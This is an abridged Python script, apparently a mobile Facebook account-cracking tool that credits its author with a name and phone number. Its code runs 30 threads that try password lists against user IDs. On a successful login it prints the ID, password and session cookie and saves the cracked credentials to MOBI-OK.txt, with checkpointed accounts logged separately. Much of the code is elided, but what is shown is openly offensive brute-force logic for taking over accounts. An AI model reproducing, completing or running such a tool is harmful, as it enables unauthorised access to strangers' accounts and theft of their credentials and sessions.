...
logo = ("""\033[1;37m
  ...
  Tools Create By Mubeen ArSHid

  WHatSapp : 03109264715

  T0ol            : Free                                                                     

  My Id Name Mubeen ArSHid
...
def fuck():
    ...
    with ThreadPool(max_workers=30) as asha:
        ...
        for love in user:
            ...
            asha.submit(MOBI,uid,pwx,tl)

    print('-------------------')

    print(' [✓] Crack process has been completed')

    print(' [✓] OK Ids saved as MOBI-OK.txt')

    print(' [✓] CP Id Save as MOBI-CP.txt')
...
def hasan(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write('\r[MOBI]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"[MOBI-OK] {uid}|{ps} \nCookie : {coki}")

                open('/sdcard/MOBI-OK.txt', 'a').write( uid+' | '+ps+'\n')
